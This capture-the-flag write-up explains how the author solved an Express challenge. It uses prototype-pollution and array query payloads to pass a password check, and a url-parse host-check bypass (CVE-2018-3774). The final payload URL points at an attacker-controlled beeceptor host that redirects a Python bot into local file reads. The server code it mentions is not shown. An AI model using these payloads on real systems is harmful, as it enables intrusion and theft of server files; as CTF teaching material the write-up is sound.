## Skills required: NodeJS/Express backend framework, URL parsing confusion, being resourceful

At first I misread the two demo flags as 2 *parts* of 1 flag as opposed to 2 flags (for the 2 challenges) and delayed solving it.
The decision to switch to this challenge proved to be right by the number of solves (and my eventual solve half an hour before the end).

## Solution:

For the first step, I always **look at the dependencies, whose vulnerabilities may give realistic attack surfaces**.
I used `npm audit` as the primary way, but I also looked at Snyk.

Using `npm audit` is a little bit better than snyk, as it captured a prototype pollution vulnerability in `qs`,
which in [snyk](https://security.snyk.io/package/npm/express/4.17.1) would require signing in to show:

![image](https://user-images.githubusercontent.com/114584910/210392189-83d741cc-06fa-476b-bef9-064d501c19bb.png)

While this may not reveal vulnerabilities by misconfiguration, now I had a rough picture of what to look for when I **look at the code** and try the app now:

### Weird permission check
```js
if (req.query.password.length > 12 || req.query.password != "Th!sIsS3xreT0") {
    return res.send(`You don't have permission\n${req.query.password.length}\n${req.query.password}`)
}
```
- Th!sIsS3xreT0 is 13-character long while its length has to be at most 12
- One key is that loose inequality `!=` is used instead of strict inequality `!==`, we can try using variables of different types.
- This can be solved in 2 ways:
  1. We can use the [prototype pollution vuln](https://github.com/advisories/GHSA-hrpp-h998-j3pp) discovered: `?password[__proto__]=Th!sIsS3xreT0&password[__proto__]&password[length]=1`
  1. As the `extended` flag of `bodyParser.urlencoded` is true (juicy express stuff), I can simply supply `?password[]=Th!sIsS3xreT0`, which makes password an array of length 1, containing the string

### Protocol and host checking
```js
const IsValidProtocol = (s, protocols = ['http', 'https']) => {
    try {
        new URL(s); ``
        const parsed = parse(s);
        return protocols
            ? parsed.protocol
                ? protocols.map(x => x.toLowerCase() + ":").includes(parsed.protocol)
                : false
            : true;
    } catch (err) {
        return false;
    }
};
const isValidHost = (url => {
    const parse = new urlParse(url)
    // console.log(parse)
    return parse.host === "i.ibb.co" ? true : false
})
app.post('/api/getImage', isAdmin, validate, async (req, res, next) => {
    try {
        const url = req.body.url.toString()
        let result = {}
        if (IsValidProtocol(url)) {
            const flag = isValidHost(url)
            if (flag) {
                console.log("[DEBUG]: " + url)
                let res = await downloadImage(url)
                result = res
            } else {
                result.status = false
                result.data = "Invalid host i.ibb.co"
            }

        } else {
            result.status = false
            result.data = "Invalid url"
        }
        res.json(result)
    } catch (error) {
        res.status(500).send(error.stack)
    }
})
```
- Requests to `/api/getImage` will pass through 2 middlewares: `isAdmin` and `validate`. If the checks fail, the requests are blocked. `validate` is not interesting at least for this challenge.
- `IsValidProtocol` checks a few things:
  - The URL is valid according to NodeJS's `url` module (otherwise an error is thrown)
  - The parsed protocol is either `http` or `https`.
    - While it might be possible to inject some property to the protocols array, say `protocols[2]="file",` .map will refuse to handle that due to the length being `2`, which cannot be changed by pollution
  - This part alone is not very interesting.
- `isValidHost` uses the vulnerable `url-parse` to check the host.
  - For some background information, **[URL parsing is extremely difficult](https://www.slideshare.net/codeblue_jp/a-new-era-of-ssrf-exploiting-url-parser-in-trending-programming-languages-by-orange-tsai)** (by Orange Tsai)
  - The URL is checked with `url-parse` (javascript), but it's finally used in `bot.py` (python) so interesting things can happen
  - Enumerating the vulns (snyk does present them in a nicer format):
    - ~~CVE-2022-0639~~ invalid new URL()
    - ~~CVE-2022-0686~~ parsed host must contain :
    - ~~CVE-2022-0691~~ invalid URL
    - ~~CVE-2022-0512~~ parsed host must contain @
    - ~~CVE-2021-3664~~ parsed host is empty
    - ~~CVE-2021-27515~~ parsed host is empty
    - ~~CVE-2020-8124~~ *this is why the service maker implemented the WAF but finally gave up and used Python (I love the little story)*
    - **CVE-2018-3774** `https://<mydomain>\\@i.ibb.co` *(I missed this initially and only saw %5c, which produces invalid URL, kudos for admin's reassurance)*
    - *Post solve reflection: I should have given up rewriting the protofol earlier from the vulnerabilities alone, there is also another good clue in the next part*

### Python file retrieval logic
```py
url = sys.argv[1]
headers = {'user-agent': 'PythonBot/0.0.1'}
request = requests.session()
request.mount('file://', LocalFileAdapter())

# check extentsion
white_list_ext = ('.jpg', '.png', '.jpeg', '.gif')
vaild_extension = url.endswith(white_list_ext)
if (vaild_extension):
    # check content-type
    res = request.head(url, headers=headers, timeout=3)
    if ('image' in res.headers.get("Content-type")
            or 'image' in res.headers.get("content-type")
            or 'image' in res.headers.get("Content-Type")):
        r = request.get(url, headers=headers, timeout=3)
        print(base64.b64encode(r.content))
    else:
        print(0)
else:
    print(0)
```
- The unparsed url must end with some image formats. *This check is useless ~~because I can put whatever I like in the #hash~~*
- The **content-type** part is the most interesting, because it hinted that a direct use of `file` protocol in the `url` variable passed from `index.js` would be meaningless, as our flag is plain text.
  - **I need to build my own server and redirect the HTTP request to a FILE request, turning RFI into LFI**
  - Having played CyberSecurityRumble2022, I know that I can create [SimpleHTTPServers](https://docs.python.org/3/library/http.server.html#http.server.SimpleHTTPRequestHandler) that can handle HEAD, GET or even SPAM requests with ease.
  - *This check is useless **because I own the server** - I can redirect to wherever I like.*

Then I quickly spun up a server:
- Note how GET and HEAD are the same, this is okay because [HEAD requests donâ€™t follow redirects anymore.](https://requests.readthedocs.io/en/latest/community/updates/?highlight=HEAD#id101)
- 172.17.0.1 is the default docker0 gateway
- This code allows for arbitrary file read.

### Hosting the thing

I have had pretty good experience with https://webhook.site but the `\@i.ibb.co` URL part won't pass.
Fortunately a similar site https://beeceptor.com offers a similar service, but a subdomain is used as opposed to a subfolder. It also supports conditional rules based on method and path. A final payload of `url=https://alrighty.free.beeceptor.com:443\@i.ibb.co/pwn.jpg` should work.
